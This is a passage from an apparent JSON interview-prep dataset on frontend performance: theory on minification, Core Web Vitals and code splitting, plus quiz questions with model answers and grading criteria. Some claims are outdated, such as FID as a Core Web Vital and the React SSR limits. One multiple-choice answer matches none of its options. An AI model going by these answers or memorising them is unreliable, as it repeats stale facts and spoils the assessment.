              "code": "// Original JavaScript\nfunction calculateSum(a, b) {\n  // This function calculates the sum of two numbers\n  const result = a + b;\n  return result;\n}\n\n// Minified JavaScript\nfunction calculateSum(a,b){const result=a+b;return result;}",
              "explanation": "This example shows how minification removes whitespace, comments, and shortens variable names (though `result` here is too simple for a major change) to reduce file size without altering functionality.",
              "language": "javascript"
            },
            {
              "id": "example_gzip_1",
              "title": "Gzip Compression (Conceptual)",
              "code": "/* \n  Server-side configuration for Gzip (e.g., in Nginx)\n  \n  gzip on;\n  gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\n  gzip_comp_level 6;\n  gzip_min_length 1000;\n*/\n\n// Browser receives compressed content and decompresses it automatically.",
              "explanation": "While Gzip is a server-side configuration, this snippet conceptually shows how a server (like Nginx) is configured to compress specific text-based file types to reduce their transfer size.",
              "language": "nginx"
            }
          ],
          "relatedQuestions": [
            "question_deployment_checklist_1",
            "question_deployment_checklist_2",
            "question_deployment_checklist_3",
            "question_deployment_checklist_4",
            "question_deployment_checklist_5",
            "question_deployment_checklist_6",
            "question_deployment_checklist_7",
            "question_deployment_checklist_8",
            "question_deployment_checklist_9",
            "question_deployment_checklist_10",
            "question_deployment_checklist_11",
            "question_deployment_checklist_12"
          ],
          "relatedTasks": [
            "task_configure_webpack_optimization",
            "task_implement_service_worker_caching"
          ],
          "tags": [
            "performance",
            "deployment",
            "optimization",
            "build-process",
            "web-essentials"
          ],
          "technology": "Web Performance",
          "prerequisites": [
            "javascript_basics",
            "css_basics",
            "http_protocol"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "senior_frontend_dev",
            "devops_for_frontend"
          ]
        },
        {
          "id": "theory_frontend_performance_metrics",
          "title": "Frontend Performance Metrics: Core Web Vitals and Beyond",
          "content": "Understanding and measuring frontend performance is crucial for delivering a good user experience. Key metrics provide insights into how quickly content loads, becomes interactive, and maintains visual stability.\n\n## Core Web Vitals\nCore Web Vitals are a set of standardized metrics from Google that measure real-world user experience for loading performance, interactivity, and visual stability. They are significant because they are used as ranking signals by Google Search.\n\n-   **LCP (Largest Contentful Paint)**:\n    -   **What it measures**: Loading performance. Specifically, it reports the render time of the largest image or text block visible within the viewport. This is often perceived as the main content load.\n    -   **Good threshold**: Within 2.5 seconds of when the page first starts loading.\n    -   **Impact**: A low LCP indicates that users see the primary content of the page quickly, leading to a better first impression.\n\n-   **FID (First Input Delay)**:\n    -   **What it measures**: Interactivity. It quantifies the time from when a user first interacts with a page (e.g., clicks a button, taps a link) to the time when the browser is actually able to begin processing event handlers in response to that interaction. High FID usually indicates a busy main thread.\n    -   **Good threshold**: 100 milliseconds or less.\n    -   **Impact**: A low FID means the page responds quickly to user actions, leading to a smoother and more responsive experience.\n\n-   **CLS (Cumulative Layout Shift)**:\n    -   **What it measures**: Visual stability. It quantifies the amount of unexpected layout shift of visual page content. An unexpected layout shift occurs when a visible element changes its position from one rendered frame to the next. For example, text moving down because an image loads above it.\n    -   **Good threshold**: 0.1 or less.\n    -   **Impact**: A low CLS score ensures a stable visual experience, preventing users from clicking the wrong element or losing their place while reading.\n\n## Additional Metrics\nBeyond Core Web Vitals, other metrics provide more granular insights into the loading process:\n\n-   **TTFB (Time to First Byte)**:\n    -   **What it measures**: Server response time. It's the time it takes for a user's browser to receive the very first byte of content from the server after making an HTTP request. It includes DNS lookup, TCP connection, and server processing.\n    -   **Impact**: A high TTFB can indicate server-side performance issues or network latency.\n\n-   **FCP (First Contentful Paint)**:\n    -   **What it measures**: When the first bit of content (text, image, non-white canvas, SVG) is painted to the screen. It signifies the first visual feedback to the user that the page is loading.\n    -   **Impact**: A low FCP provides early visual reassurance to users that the page is loading.\n\n-   **TTI (Time to Interactive)**:\n    -   **What it measures**: When the page is fully interactive. This is the point at which the layout is stable, key web fonts are visible, and the main thread is idle enough to handle user input reliably.\n    -   **Impact**: A low TTI means users can quickly and reliably interact with the page, avoiding frustrating delays or unresponsive UIs.",
          "examples": [],
          "relatedQuestions": [
            "question_performance_metrics_1",
            "question_performance_metrics_2",
            "question_performance_metrics_3",
            "question_performance_metrics_4",
            "question_performance_metrics_5",
            "question_performance_metrics_6",
            "question_performance_metrics_7",
            "question_performance_metrics_8",
            "question_performance_metrics_9",
            "question_performance_metrics_10",
            "question_performance_metrics_11"
          ],
          "relatedTasks": [
            "task_analyze_and_improve_lcp",
            "task_debug_and_fix_cls"
          ],
          "tags": [
            "performance",
            "metrics",
            "core-web-vitals",
            "user-experience",
            "seo"
          ],
          "technology": "Web Performance",
          "prerequisites": [
            "http_protocol",
            "browser_rendering_pipeline"
          ],
          "complexity": 6,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "web_performance_engineer",
            "frontend_architect"
          ]
        },
        {
          "id": "theory_performance_optimization_techniques",
          "title": "Frontend Performance Optimization Techniques: Code Splitting and Lazy Loading",
          "content": "Efficient loading of web applications is paramount for user satisfaction. Code splitting and lazy loading are powerful techniques to achieve this by only loading what's immediately necessary.\n\n## Code Splitting\nCode splitting is a technique supported by bundlers like Webpack, Rollup, or Parcel, that allows you to split your code into various bundles which can then be loaded on demand or in parallel. This can drastically improve the load time of your application, especially for large single-page applications (SPAs), as the initial bundle size is reduced. Instead of loading one monolithic JavaScript file, the browser only downloads the parts of the application needed for the current view.\n\n## React.lazy and Suspense\n`React.lazy` is a built-in React function that enables component-level code splitting. It lets you render a dynamic import as a regular React component. This means the component's code is loaded only when it's first rendered, not upfront with the initial bundle.\n\n`Suspense` is a React component that allows you to \"wait\" for some code to load and declaratively specify a loading indicator (fallback UI) while waiting. It's designed to work hand-in-hand with `React.lazy` to handle the asynchronous loading of components.\n\n### Important Notes for `React.lazy` and `Suspense`:\n-   `React.lazy` takes a function that must call a dynamic `import()` statement. This `import()` returns a Promise that resolves to a module.\n-   The Promise returned by the dynamic import must resolve to a module with a `default` export containing a React component.\n-   A lazy component (created with `React.lazy`) must always be rendered inside a `Suspense` component. The `Suspense` component provides a `fallback` prop, which is a React element that will be rendered while the lazy component is loading.\n-   Currently, `React.lazy` and `Suspense` are primarily client-side features. They are not yet available for server-side rendering (SSR) without additional workarounds or libraries (e.g., `loadable-components`). For SSR, you often need a different approach for code splitting that can pre-render the entire app.\n\n## Code Splitting with React Router\nCode splitting is particularly effective when combined with routing libraries like React Router. Instead of loading all route components upfront, you can lazy-load components for specific routes. This means the code for a particular route is only fetched when the user navigates to it, improving initial load times for the application's entry point.\n\nThis approach typically involves using `React.lazy` for each route component and wrapping the routes in a `Suspense` component.",
          "examples": [
            {
              "id": "example_dynamic_import_1",
              "title": "Basic Dynamic Import",
              "code": "// module.js\nexport function sayHello() {\n  console.log('Hello from dynamically loaded module!');\n}\n\n// main.js\ndocument.getElementById('loadButton').addEventListener('click', () => {\n  import('./module.js')\n    .then(module => {\n      module.sayHello();\n    })\n    .catch(error => {\n      console.error('Module loading failed:', error);\n    });\n});",
              "explanation": "This example demonstrates a basic dynamic import. The `module.js` code is not loaded until the button is clicked, showcasing on-demand loading.",
              "language": "javascript"
            },
            {
              "id": "example_react_lazy_suspense_1",
              "title": "React.lazy and Suspense",
              "code": "import React, { Suspense, lazy } from 'react';\n\nconst OtherComponent = lazy(() => import('./OtherComponent'));\n\nfunction MyComponent() {\n  return (\n    <div>\n      <h1>Welcome</h1>\n      <Suspense fallback={<div>Loading OtherComponent...</div>}>\n        <OtherComponent />\n      </Suspense>\n    </div>\n  );\n}\n\nexport default MyComponent;",
              "explanation": "This code shows how `React.lazy` is used to define `OtherComponent` so its bundle is loaded only when `MyComponent` attempts to render it. `Suspense` provides a `Loading...` fallback during the async load.",
              "language": "typescript"
            },
            {
              "id": "example_react_router_lazy_1",
              "title": "Code Splitting with React Router",
              "code": "import { BrowserRouter as Router, Route, Routes } from 'react-router-dom';\nimport React, { Suspense, lazy } from 'react';\n\n// Use lazy loading for route components\nconst Home = lazy(() => import('./routes/Home'));\nconst About = lazy(() => import('./routes/About'));\nconst Contact = lazy(() => import('./routes/Contact'));\n\nfunction App() {\n  return (\n    <Router>\n      <Suspense fallback={<div>Loading Page...</div>}>\n        <Routes>\n          <Route path=\"/\" element={<Home />} />\n          <Route path=\"/about\" element={<About />} />\n          <Route path=\"/contact\" element={<Contact />} />\n        </Routes>\n      </Suspense>\n    </Router>\n  );\n}\n\nexport default App;",
              "explanation": "This example demonstrates how to implement code splitting with React Router. Each route's component (`Home`, `About`, `Contact`) is lazy-loaded. The `Suspense` component wraps the `Routes` to provide a loading fallback while the specific route's component chunk is being fetched.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_optimization_techniques_1",
            "question_optimization_techniques_2",
            "question_optimization_techniques_3",
            "question_optimization_techniques_4",
            "question_optimization_techniques_5",
            "question_optimization_techniques_6",
            "question_optimization_techniques_7",
            "question_optimization_techniques_8"
          ],
          "relatedTasks": [
            "task_implement_react_lazy_suspense",
            "task_code_splitting_react_router"
          ],
          "tags": [
            "performance",
            "optimization",
            "react",
            "code-splitting",
            "lazy-loading",
            "webpack"
          ],
          "technology": "React",
          "prerequisites": [
            "react_basics",
            "es6_modules",
            "promises",
            "webpack_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_developer",
            "frontend_architect"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_deployment_checklist_1",
          "topic": "Bundle Minification",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary goal of bundle minification in frontend deployment?",
          "answer": "To reduce the file size of JavaScript and CSS assets by removing unnecessary characters, leading to faster download times.",
          "analysisPoints": [
            "Minification removes whitespace, comments, and often renames variables.",
            "It focuses on byte-size reduction for faster network transfer.",
            "It does not change the functionality of the code."
          ],
          "keyConcepts": [
            "minification",
            "bundle size",
            "load time"
          ],
          "evaluationCriteria": [
            "Ability to define minification's purpose"
          ],
          "example": "",
          "tags": [
            "minification",
            "deployment",
            "optimization"
          ],
          "prerequisites": [
            "web_performance_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_deployment_checklist_2",
          "topic": "Tree Shaking",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following best describes 'tree shaking' in the context of frontend optimization?\n\n```javascript\n// utils.js\nexport function add(a, b) { return a + b; }\nexport function subtract(a, b) { return a - b; }\n\n// main.js\nimport { add } from './utils';\nconsole.log(add(1, 2));\n// The 'subtract' function is never used.\n```",
          "answer": "Removing unused code from the final JavaScript bundle during the build process, like the `subtract` function in the example.",
          "options": [
            "Compressing image assets to reduce their file size.",
            "Breaking down a large JavaScript file into smaller, loadable chunks.",
            "Removing unused code from the final JavaScript bundle during the build process, like the `subtract` function in the example.",
            "Optimizing the order of CSS rules for faster rendering."
          ],
          "analysisPoints": [
            "Tree shaking is a form of dead code elimination.",
            "It relies on the static analysis of ES Modules.",
            "Its primary benefit is reducing bundle size and thus load time."
          ],
          "keyConcepts": [
            "tree shaking",
            "dead code elimination",
            "bundle size",
            "ES modules"
          ],
          "evaluationCriteria": [
            "Understanding of tree shaking mechanism.",
            "Ability to differentiate it from other optimization techniques."
          ],
          "example": "Tree shaking works by analyzing import/export statements. If a module exports multiple functions but only one is imported and used, the unused functions are 'shaken out' of the final bundle, reducing its size.",
          "tags": [
            "tree-shaking",
            "optimization",
            "webpack",
            "bundle-size"
          ],
          "prerequisites": [
            "es6_modules",
            "javascript_bundlers"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_deployment_checklist_3",
          "topic": "Code Splitting",
          "level": "medium",
          "type": "open",
          "question": "Explain the concept of code splitting and how it benefits initial page load performance. Provide a conceptual example of where you might apply it.",
          "answer": "Code splitting is a technique that divides your application's code into smaller, manageable chunks that can be loaded on demand or in parallel. This means the browser doesn't have to download the entire application's JavaScript bundle upfront. Instead, it only downloads the code necessary for the initial view, significantly reducing the initial payload and improving the time to interactive (TTI).\n\n**Benefit for initial page load**: By reducing the size of the initial JavaScript bundle, the browser can parse, compile, and execute less code, making the page interactive much faster.\n\n**Conceptual Example**: In a large single-page application (SPA) with multiple routes (e.g., `/home`, `/dashboard`, `/admin`), you could apply code splitting to load the `Dashboard` and `Admin` components only when the user navigates to those specific routes, rather than loading them when the application first starts. This keeps the initial bundle for the `/home` route small.",
          "analysisPoints": [
            "Definition of code splitting.",
            "Direct link between reduced initial bundle size and improved load performance.",
            "Ability to provide a relevant, practical example.",
            "Mention of 'on-demand' loading."
          ],
          "keyConcepts": [
            "code splitting",
            "initial load time",
            "bundle size",
            "on-demand loading"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of explanation.",
            "Relevance of the example.",
            "Understanding of the performance impact."
          ],
          "example": "",
          "tags": [
            "code-splitting",
            "performance",
            "optimization",
            "spa"
          ],
          "prerequisites": [
            "javascript_bundlers",
            "web_performance_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_deployment_checklist_4",
          "topic": "Cache Optimizations",
          "level": "easy",
          "type": "flashcard",
          "question": "How does 'content hashing' improve cache optimization?",
          "answer": "By adding a hash of the file's content to its filename (e.g., `bundle.f71b2a.js`), browsers can aggressively cache the file. When the file content changes, its hash changes, leading to a new filename that bypasses the old cache, ensuring users always get the latest version.",
          "analysisPoints": [
            "Content hashing creates unique filenames for unique content.",
            "Enables long-term caching headers for static assets.",
            "Ensures cache invalidation when content updates."
          ],
          "keyConcepts": [
            "caching",
            "content hashing",
            "cache invalidation",
            "browser cache"
          ],
          "evaluationCriteria": [
            "Understanding of content hashing and its role in caching"
          ],
          "example": "",
          "tags": [
            "caching",
            "optimization",
            "deployment"
          ],
          "prerequisites": [
            "http_headers"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_deployment_checklist_5",
          "topic": "Gzip Compression",
          "level": "easy",
          "type": "mcq",
          "question": "Gzip compression is most effective for which type of web assets?",
          "answer": "Text-based assets like HTML, CSS, and JavaScript files.",
          "options": [
            "Image files (JPEG, PNG)",
            "Video files (MP4, WebM)",
            "Binary files (Executables, PDFs)",
            "Text-based assets like HTML, CSS, and JavaScript files."
          ],
          "analysisPoints": [
            "Gzip works by finding repetitive patterns in text.",
            "Binary files (like images/videos) are often already compressed or have high entropy, so Gzip offers minimal benefit."
          ],
          "keyConcepts": [
            "gzip",
            "compression",
            "file types",
            "network transfer"
          ],
          "evaluationCriteria": [
            "Knowledge of Gzip's effectiveness.",
            "Understanding of what types of data compress well."
          ],
          "example": "",
          "tags": [
            "gzip",
            "compression",
            "performance"
          ],
          "prerequisites": [
            "http_protocol"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_deployment_checklist_6",
          "topic": "Image Optimization",
          "level": "medium",
          "type": "open",
          "question": "What are two common strategies for image optimization in frontend development, and why are they important for performance?",
          "answer": "1.  **Compression and Modern Formats**: Compressing images (e.g., using tools to reduce quality slightly or remove metadata) and serving them in modern formats like WebP significantly reduces file size. This is important because images often contribute the most to a page's total weight, directly impacting download times and bandwidth usage.\n2.  **Responsive Images/Lazy Loading**: Serving images at appropriate resolutions for different screen sizes (using `srcset`, `sizes`, or picture element) prevents downloading unnecessarily large images on smaller devices. Lazy loading defers the loading of images until they are in or near the viewport. Both are important because they reduce the initial page load time and conserve bandwidth, improving overall page speed and user experience.",
          "analysisPoints": [
            "Identify at least two distinct strategies.",
            "Explain the 'why' (performance benefit) for each strategy.",
            "Mention common tools or techniques (WebP, srcset, lazy loading)."
          ],
          "keyConcepts": [
            "image optimization",
            "web-performance",
            "compression",
            "responsive images",
            "lazy loading",
            "WebP"
          ],
          "evaluationCriteria": [
            "Ability to identify effective strategies.",
            "Clear explanation of performance benefits.",
            "Practical understanding of implementation."
          ],
          "example": "",
          "tags": [
            "image-optimization",
            "performance",
            "responsive-design",
            "lazy-loading"
          ],
          "prerequisites": [
            "html_images",
            "css_media_queries"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_deployment_checklist_7",
          "topic": "Critical CSS",
          "level": "medium",
          "type": "flashcard",
          "question": "What is 'Critical CSS' and why is it beneficial for initial rendering?",
          "answer": "Critical CSS is the minimum amount of CSS required to style the 'above-the-fold' content (what's immediately visible in the viewport without scrolling). It is inlined directly into the HTML `<head>`. This is beneficial because the browser can render the essential content without waiting for the external CSS stylesheet to download and parse, preventing a 'flash of unstyled content' (FOUC) and improving perceived performance (FCP).",
          "analysisPoints": [
            "Definition of critical CSS (above-the-fold).",
            "Method of delivery (inlined).",
            "Direct performance benefit (faster FCP, no FOUC)."
          ],
          "keyConcepts": [
            "critical-css",
            "fouc",
            "fcp",
            "inlining",
            "render-blocking"
          ],
          "evaluationCriteria": [
            "Understanding of critical CSS and its impact"
          ],
          "example": "",
          "tags": [
            "css",
            "performance",
            "rendering",
            "optimization"
          ],
          "prerequisites": [
            "css_rendering",
            "browser_rendering_pipeline"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_deployment_checklist_8",
          "topic": "Service Workers",
          "level": "medium",
          "type": "open",
          "question": "Describe the main role of a Service Worker in a web application. What specific deployment checklist items can they enable?",
          "answer": "A Service Worker is a JavaScript file that runs in the background, separate from the main browser thread. It acts as a programmatic proxy between the web application, the browser, and the network. Its main role is to intercept network requests, cache resources, and serve content from the cache, enabling offline capabilities and more robust caching strategies.\n\nService Workers directly enable:\n1.  **Offline capabilities**: By caching static assets and even dynamic content, they allow the application to function even when the user is offline.\n2.  **Advanced Cache optimizations**: They provide fine-grained control over caching, allowing strategies like 'cache first, then network', 'network first, then cache', or 'stale-while-revalidate'.\n3.  **Push notifications**: They can receive push messages from a server and display notifications to the user, even when the browser is closed.\n4.  **Background synchronization**: They can defer actions until the user has stable connectivity.",
          "analysisPoints": [
            "Accurate definition of a service worker's role (proxy, background thread).",
            "Identification of offline capabilities as a primary feature.",
            "Mention of advanced caching, push notifications, or background sync."
          ],
          "keyConcepts": [
            "service worker",
            "offline-first",
            "caching-strategies",
            "push-notifications",
            "PWA"
          ],
          "evaluationCriteria": [
            "Understanding of service worker architecture.",
            "Ability to list key features it enables."
          ],
          "example": "",
          "tags": [
            "service-worker",
            "pwa",
            "caching",
            "offline",
            "deployment"
          ],
          "prerequisites": [
            "javascript_async",
            "http_protocol"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_deployment_checklist_9",
          "topic": "CDN Usage",
          "level": "easy",
          "type": "flashcard",
          "question": "What is a CDN and how does it improve website performance?",
          "answer": "A CDN (Content Delivery Network) is a geographically distributed network of servers. It improves website performance by caching static assets (like images, CSS, JavaScript) on servers located closer to the end-user, reducing latency and accelerating content delivery.",
          "analysisPoints": [
            "Definition of CDN (distributed network).",
            "Explanation of how it reduces latency and improves speed.",
            "Mention of static assets."
          ],
          "keyConcepts": [
            "cdn",
            "latency",
            "static-assets",
            "caching",
            "geographical distribution"
          ],
          "evaluationCriteria": [
            "Basic understanding of CDN's role and benefits"
          ],
          "example": "",
          "tags": [
            "cdn",
            "performance",
            "network",
            "deployment"
          ],
          "prerequisites": [
            "http_protocol"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_deployment_checklist_10",
          "topic": "Error Monitoring",
          "level": "easy",
          "type": "flashcard",
          "question": "Why is 'Error Monitoring' an important part of the deployment checklist for production applications?",
          "answer": "Error monitoring allows developers to proactively identify, track, and resolve issues that users encounter in a production environment. This ensures application stability, improves user experience, and helps maintain the overall health of the system by preventing widespread failures.",
          "analysisPoints": [
            "Proactive issue identification.",
            "Impact on user experience and stability.",
            "Importance for maintenance and reliability."
          ],
          "keyConcepts": [
            "error-monitoring",
            "production",
            "debugging",
            "reliability",
            "user-experience"
          ],
          "evaluationCriteria": [
            "Understanding the value of error monitoring"
          ],
          "example": "",
          "tags": [
            "error-handling",
            "monitoring",
            "production",
            "deployment"
          ],
          "prerequisites": [
            "javascript_error_handling"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_deployment_checklist_11",
          "topic": "Deployment Checklist Overview",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following optimization techniques is primarily aimed at reducing the **initial** download size of your JavaScript bundle for a large application?\n\nI. Image Optimization\nII. Gzip Compression\nIII. Code Splitting\nIV. Critical CSS Inlining",
          "answer": "III. Code Splitting",
          "options": [
            "I and II only",
            "III only",
            "II and III only",
            "I, II, III, and IV"
          ],
          "analysisPoints": [
            "Code splitting directly reduces the *initial* JS bundle size by deferring loading.",
            "Gzip compression reduces the *transfer size* of the bundle but the *uncompressed* size is still the same. It's about network efficiency, not initial parsing/execution size reduction.",
            "Image optimization targets image assets, not specifically JS bundle size.",
            "Critical CSS targets CSS for above-the-fold content, not JS bundle size."
          ],
          "keyConcepts": [
            "code-splitting",
            "bundle-size",
            "initial-load",
            "optimization"
          ],
          "evaluationCriteria": [
            "Ability to distinguish between different optimization goals.",
            "Understanding of the direct impact of each technique."
          ],
          "example": "While all options contribute to overall performance, code splitting is the most direct way to reduce the *logical* size of the initial JavaScript bundle that needs to be parsed and executed upfront.",
          "tags": [
            "optimization",
            "code-splitting",
            "bundle-size",
            "performance"
          ],
          "prerequisites": [
            "web_performance_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_deployment_checklist_12",
          "topic": "Deployment Checklist Combined",
          "level": "hard",
          "type": "open",
          "question": "Imagine you're auditing a new frontend application before its first production deployment. You notice that the initial load time is very high (over 5 seconds) and users frequently report 'jumps' in content while browsing. What three items from the deployment checklist would you prioritize addressing first, and why?",
          "answer": "Given a high initial load time (over 5 seconds) and content 'jumps' (indicating layout shifts), I would prioritize the following three items:\n\n1.  **Code Splitting**: High initial load time often means a large JavaScript bundle. Code splitting can drastically reduce the initial payload by only loading necessary code for the first view, improving Time to Interactive and overall load speed.\n2.  **Image Optimization**: Images are frequently the largest contributors to page weight. Unoptimized images can significantly increase download times. Compressing and serving optimized images (e.g., WebP, responsive images) would directly tackle the load time issue.\n3.  **Critical CSS / Cumulative Layout Shift (CLS) Mitigation**: Content 'jumps' are a direct symptom of poor visual stability, typically measured by CLS. Inlining critical CSS ensures the styling for above-the-fold content loads immediately, preventing FOUC and layout shifts as other stylesheets or content load later. Also, ensuring images and embeds have explicit dimensions can prevent CLS. Addressing CLS would directly fix the 'jumps' reported by users.",
          "analysisPoints": [
            "Correctly diagnose the root causes based on symptoms.",
            "Prioritize solutions that directly address the most critical symptoms.",
            "Provide clear justifications for each chosen priority.",
            "Connect the symptoms (slow load, jumps) to specific checklist items (code splitting, image optimization, critical CSS/CLS)."
          ],
          "keyConcepts": [
            "performance-auditing",
            "troubleshooting",
            "code-splitting",
            "image-optimization",
            "critical-css",
            "cls"
          ],
          "evaluationCriteria": [
            "Problem-solving ability.",
            "Prioritization skills.",
            "Depth of understanding of optimization techniques and their impact."
          ],
          "example": "",
          "tags": [
            "deployment",
            "performance",
            "troubleshooting",
            "prioritization",
            "cls",
            "load-time"
          ],
          "prerequisites": [
            "all_deployment_checklist_items",
            "frontend_performance_metrics"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_performance_metrics_1",
          "topic": "Core Web Vitals",
          "level": "easy",
          "type": "flashcard",
          "question": "Name the three Core Web Vitals.",
          "answer": "Largest Contentful Paint (LCP), First Input Delay (FID), and Cumulative Layout Shift (CLS).",
          "analysisPoints": [
            "Correctly recall the three metrics."
          ],
          "keyConcepts": [
            "core-web-vitals",
            "lcp",
            "fid",
            "cls"
          ],
          "evaluationCriteria": [
            "Basic recall of core web vitals"
          ],
          "example": "",
          "tags": [
            "performance",
            "metrics",
            "core-web-vitals"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_performance_metrics_2",
          "topic": "LCP (Largest Contentful Paint)",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following describes what LCP (Largest Contentful Paint) measures?\n\n```html\n<body>\n  <header>...</header>\n  <main>\n    <h1>Welcome to our site!</h1>\n    <img src=\"hero.jpg\" alt=\"Hero Image\" class=\"main-hero-image\" />\n    <p>Some introductory text.</p>\n  </main>\n</body>\n```\n\nAssuming `hero.jpg` is a large image visible in the viewport.",
          "answer": "The render time of the largest image or text block visible within the viewport, often representing the main content load.",
          "options": [
            "The time it takes for the first byte of the page to arrive from the server.",
            "The time from when a user first interacts with a page to when the browser processes that interaction.",
            "The cumulative score of unexpected layout shifts during the page's lifecycle.",
            "The render time of the largest image or text block visible within the viewport, often representing the main content load."
          ],
          "analysisPoints": [
            "LCP is about the largest *contentful* element.",
            "It focuses on *loading performance* and *perceived speed*.",
            "The example shows a common LCP element (hero image or main heading)."
          ],
          "keyConcepts": [
            "lcp",
            "loading-performance",
            "perceived-speed",
            "viewport",
            "contentful"
          ],
          "evaluationCriteria": [
            "Accurate definition of LCP.",
            "Distinction from other metrics."
          ],
          "example": "In the provided HTML, if `hero.jpg` is the largest element visible in the viewport when the page loads, its render time would be the LCP. Optimizing this image (size, format, preloading) is key to improving LCP.",
          "tags": [
            "lcp",
            "core-web-vitals",
            "performance",
            "metrics"
          ],
          "prerequisites": [
            "web_rendering_basics"
          ],
          "complexity": 5,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_performance_metrics_3",
          "topic": "FID (First Input Delay)",
          "level": "medium",
          "type": "open",
          "question": "A user complains that when they click a button on your website, there's a noticeable delay before anything happens. Which Core Web Vital is most directly impacted by this issue, and what might be a common cause?",
          "answer": "The Core Web Vital most directly impacted is **FID (First Input Delay)**. FID measures the time from when a user first interacts with a page (e.g., clicking a button) to the time when the browser is actually able to begin processing event handlers in response to that interaction.\n\nA common cause for a high FID is a **busy main thread**. If the main thread is occupied with long-running JavaScript tasks (like parsing, compiling, or executing a large script), it cannot immediately respond to user input. This leads to input delay and a unresponsive user experience.",
          "analysisPoints": [
            "Correctly identify FID as the affected metric.",
            "Provide a clear explanation of what FID measures.",
            "Identify 'busy main thread' or 'long JavaScript tasks' as the primary cause."
          ],
          "keyConcepts": [
            "fid",
            "interactivity",
            "main-thread",
            "long-tasks",
            "user-experience"
          ],
          "evaluationCriteria": [
            "Diagnostic ability for performance issues.",
            "Understanding of FID's measurement and common causes."
          ],
          "example": "",
          "tags": [
            "fid",
            "core-web-vitals",
            "performance",
            "interactivity"
          ],
          "prerequisites": [
            "javascript_execution",
            "browser_rendering_pipeline"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_performance_metrics_4",
          "topic": "CLS (Cumulative Layout Shift)",
          "level": "medium",
          "type": "mcq",
          "question": "Which scenario is most likely to result in a high CLS (Cumulative Layout Shift) score?",
          "answer": "An image loading dynamically without predefined dimensions, causing text below it to suddenly jump down.",
          "options": [
            "A large JavaScript bundle delaying the initial render of the page.",
            "A slow server response time delaying the delivery of the first byte of content.",
            "An image loading dynamically without predefined dimensions, causing text below it to suddenly jump down.",
            "The browser taking a long time to parse and execute initial JavaScript before the page becomes interactive."
          ],
          "analysisPoints": [
            "CLS specifically measures *unexpected visual shifts*.",
            "Dynamic content without reserved space is a classic cause of CLS.",
            "Distinguish CLS from loading or interactivity metrics."
          ],
          "keyConcepts": [
            "cls",
            "visual-stability",
            "layout-shifts",
            "dynamic-content",
            "image-dimensions"
          ],
          "evaluationCriteria": [
            "Understanding of CLS measurement.",
            "Ability to identify common causes of layout shifts."
          ],
          "example": "When an image without `width` and `height` attributes loads, the browser initially allocates no space for it. Once the image loads, the browser has to reflow the layout, causing content below it to shift, leading to a poor CLS score.",
          "tags": [
            "cls",
            "core-web-vitals",
            "performance",
            "layout"
          ],
          "prerequisites": [
            "css_box_model",
            "html_images"
          ],
          "complexity": 5,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_performance_metrics_5",
          "topic": "TTFB (Time to First Byte)",
          "level": "easy",
          "type": "flashcard",
          "question": "What does TTFB (Time to First Byte) measure, and what does a high TTFB typically indicate?",
          "answer": "TTFB measures the time it takes for a user's browser to receive the first byte of content from the server. A high TTFB typically indicates server-side performance issues, slow database queries, or high network latency between the user and the server.",
          "analysisPoints": [
            "Definition of TTFB (server response).",
            "Common causes of high TTFB."
          ],
          "keyConcepts": [
            "ttfb",
            "server-response",
            "latency",
            "backend-performance"
          ],
          "evaluationCriteria": [
            "Understanding of TTFB and its implications"
          ],
          "example": "",
          "tags": [
            "ttfb",
            "performance",
            "metrics",
            "server-side"
          ],
          "prerequisites": [
            "http_protocol"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_performance_metrics_6",
          "topic": "FCP (First Contentful Paint)",
          "level": "easy",
          "type": "flashcard",
          "question": "When does FCP (First Contentful Paint) occur?",
          "answer": "FCP occurs when the first content (text, image, non-white canvas, or SVG) is painted to the screen, providing the user with the first visual feedback that the page is loading.",
          "analysisPoints": [
            "Definition of FCP (first visual content).",
            "Importance of early visual feedback."
          ],
          "keyConcepts": [
            "fcp",
            "visual-feedback",
            "loading-performance"
          ],
          "evaluationCriteria": [
            "Basic understanding of FCP"
          ],
          "example": "",
          "tags": [
            "fcp",
            "performance",
            "metrics"
          ],
          "prerequisites": [
            "web_rendering_basics"
          ],
          "complexity": 3,
